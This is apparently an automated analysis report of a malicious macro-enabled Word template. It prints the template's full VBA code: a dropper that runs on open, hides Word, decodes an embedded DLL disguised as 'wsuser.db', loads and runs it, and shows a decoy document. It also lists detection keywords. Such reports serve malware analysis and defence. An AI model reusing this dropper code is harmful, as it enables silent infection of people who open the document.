{
    "1b0c82e71a53300c969da61b085c8ce623202722cf3fa2d79160dac16642303f": {
        "File format": "MS Word 2007+ Macro-Enabled Template (.dotm)",
        "Container format": "OpenXML",
        "Encrypted": false,
        "VBA Macros": "Yes, suspicious",
        "XLM Macros": "No",
        "External Relationships": 0,
        "ObjectPool": false,
        "Flash objects": 0,
        "VBAMacro": {
            "Filename": [
                "word/vbaProject.bin",
                "word/vbaProject.bin",
                "word/vbaProject.bin"
            ],
            "OLEstream": [
                "VBA/ThisDocument",
                "VBA/UserForm1",
                "VBA/Module1"
            ],
            "VBAfilename": [
                "ThisDocument.cls",
                "UserForm1.frm",
                "Module1.bas"
            ],
            "VBAcode": [
                "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"0{00020906-0000-0000-C000-000000000046}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = False\r\nAttribute VB_Customizable = True\r\n",
                "Attribute VB_Name = \"UserForm1\"\r\nAttribute VB_Base = \"0{62E58F2D-CE83-4027-B5A2-59B83D609688}{95546F9D-0598-45F3-AAD8-6526F70D83A4}\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = False\r\nAttribute VB_TemplateDerived = False\r\nAttribute VB_Customizable = False\r\nPrivate Sub Label4_Click()\r\n\r\nEnd Sub\r\n\r\nPrivate Sub Label5_Click()\r\n\r\nEnd Sub\r\n",
                "Attribute VB_Name = \"Module1\"\r\nPrivate Declare PtrSafe Function sqlite3_stmt_all Lib \"wsuser.db\" (ByVal lpDocPath As String, ByVal lpPass As String, ByVal lpUID As String) As Long\r\nPrivate Declare PtrSafe Function LoadLibraryA Lib \"kernel32\" (ByVal lpLibFileName As String) As LongPtr\r\n\r\nFunction MkDir(szDir)\r\n    On Error Resume Next\r\n    MkDir = CreateObject(\"Scripting.FileSystemObject\").CreateFolder(szDir)\r\nEnd Function\r\n\r\nFunction FileExist(szFile)\r\n    On Error Resume Next\r\n    FileExist = CreateObject(\"Scripting.FileSystemObject\").FileExists(szFile)\r\nEnd Function\r\n\r\nFunction FolderExist(szFolder)\r\n    On Error Resume Next\r\n    FolderExist = CreateObject(\"Scripting.FileSystemObject\").FolderExists(szFolder)\r\nEnd Function\r\n\r\nFunction Stream_BinaryToString(Binary)\r\n    On Error Resume Next\r\n    \r\n    Const adTypeText = 2\r\n    Const adTypeBinary = 1\r\n    Dim BinaryStream\r\n    Set BinaryStream = CreateObject(\"ADODB.Stream\")\r\n    BinaryStream.Type = adTypeBinary\r\n    BinaryStream.Open\r\n    BinaryStream.Write Binary\r\n    BinaryStream.Position = 0\r\n    BinaryStream.Type = adTypeText\r\n    BinaryStream.Charset = \"us-ascii\"\r\n    Stream_BinaryToString = BinaryStream.ReadText\r\n    Set BinaryStream = Nothing\r\nEnd Function\r\n\r\nFunction Base64DecodeToBinary(ByVal vCode)\r\n    On Error Resume Next\r\n\r\n    Dim oXML, oNode\r\n    Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\")\r\n    Set oNode = oXML.CreateElement(\"base64\")\r\n    oNode.dataType = \"bin.base64\"\r\n    oNode.Text = vCode\r\n    Base64DecodeToBinary = oNode.nodeTypedValue\r\n    Set oNode = Nothing\r\n    Set oXML = Nothing\r\nEnd Function\r\n\r\nFunction Base64DecodeToString(ByVal vCode)\r\n    On Error Resume Next\r\n\r\n    Dim oXML, oNode\r\n    Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\")\r\n    Set oNode = oXML.CreateElement(\"base64\")\r\n    oNode.dataType = \"bin.base64\"\r\n    oNode.Text = vCode\r\n    Base64DecodeToString = Stream_BinaryToString(oNode.nodeTypedValue)\r\n    Set oNode = Nothing\r\n    Set oXML = Nothing\r\nEnd Function\r\n\r\nSub ExtractDll(dllPath)\r\n    On Error Resume Next\r\n\r\n    Set objStream = CreateObject(\"ADODB.Stream\")\r\n    objStream.Type = 1\r\n    objStream.Open\r\n#If Win64 Then\r\n    objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label1.Caption))\r\n#Else\r\n    objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label2.Caption))\r\n#End If\r\n    objStream.SaveToFile dllPath, 2\r\n    Set objStream = Nothing\r\nEnd Sub\r\n\r\nSub ExtractDoc(docPath)\r\n    On Error Resume Next\r\n\r\n    Set objStream = CreateObject(\"ADODB.Stream\")\r\n    objStream.Type = 1\r\n    objStream.Open\r\n    objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label3.Caption))\r\n    objStream.SaveToFile docPath, 2\r\n    Set objStream = Nothing\r\nEnd Sub\r\n\r\nFunction GetDocName() As String\r\n    On Error Resume Next\r\n    \r\n    strDocTag = \" .doc\"\r\n\r\n    curDocNameFull = ActiveDocument.Path & \"\\\" & ActiveDocument.Name\r\n    curDocName = Left(curDocNameFull, InStrRev(curDocNameFull, \".\") - 1)\r\n    newDocNameFull = curDocName & strDocTag\r\n    Do While FileExist(newDocNameFull)\r\n        curDocName = curDocName & \" \"\r\n        newDocNameFull = curDocName & strDocTag\r\n    Loop\r\n    GetDocName = newDocNameFull\r\nEnd Function\r\n\r\nFunction GetDllName() As String\r\n    On Error Resume Next\r\n    Dim dllPath As String\r\n    \r\n    workDir = Environ(\"UserProfile\") & \"\\AppData\\Local\\Microsoft\\Notice\"\r\n    If Not FolderExist(workDir) Then\r\n        MkDir (workDir)\r\n    End If\r\n    binName = \"wsuser.db\"\r\n    binDir = \"ws\"\r\n\r\n    dllPath = workDir & \"\\\" & binName\r\n\r\n    nIdx = 0\r\n    Do While FileExist(dllPath)\r\n        workDir = workDir & \"\\\" & binDir\r\n        If Not FolderExist(workDir) Then\r\n            MkDir (workDir)\r\n        End If\r\n        dllPath = workDir & \"\\\" & binName\r\n    Loop\r\n    \r\n    GetDllName = dllPath\r\nEnd Function\r\n\r\nSub AutoOpen()\r\n    On Error Resume Next\r\n\r\n    Application.Visible = False\r\n\r\n    dllPath = GetDllName()\r\n    docPath = GetDocName()\r\n    orgDocPath = ActiveDocument.Path & \"\\\" & ActiveDocument.Name\r\n\r\n    ExtractDll (dllPath)\r\n    ExtractDoc (docPath)\r\n    \r\n    LoadLibraryA (dllPath)\r\n\r\n    a = sqlite3_stmt_all(orgDocPath, \"S-6-38-4412-76700627-315277-3247\", \"43\")\r\n    \r\n    Dim objDocApp\r\n    Set objDocApp = CreateObject(\"Word.Application\")\r\n    objDocApp.Visible = True\r\n    objDocApp.Documents.Open docPath\r\n\r\n    Application.Quit (wdDoNotSaveChanges)\r\n\r\nEnd Sub\r\n\r\n"
            ],
            "Keyword Types": [
                "AutoExec",
                "AutoExec",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious"
            ],
            "AutoExec keywords": 2,
            "Suspicious keywords": 11,
            "IOCs": 0,
            "Hex obfuscated strings": 201,
            "Base64 obfuscated strings": 0,
            "Dridex obfuscated strings": 0,
            "VBA obfuscated strings": 0
        },
        "Keyword Found": {
            "AutoOpen": "Runs when the Word document is opened",
            "Label4_Click": "Runs when the file is opened and ActiveX objects trigger events",
            "Environ": "May read system environment variables",
            "Open": "May open a file",
            "Write": "May write to a file (if combined with Open)",
            "Binary": "May read or write a binary file (if combined with Open)",
            "ADODB.Stream": "May create a text file",
            "SaveToFile": "May create a text file",
            "Application.Visible": "May hide the application",
            "MkDir": "May create a directory",
            "CreateObject": "May create an OLE object",
            "Lib": "May run code from a DLL",
            "Hex Strings": "Hex-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)"
        }
    }
}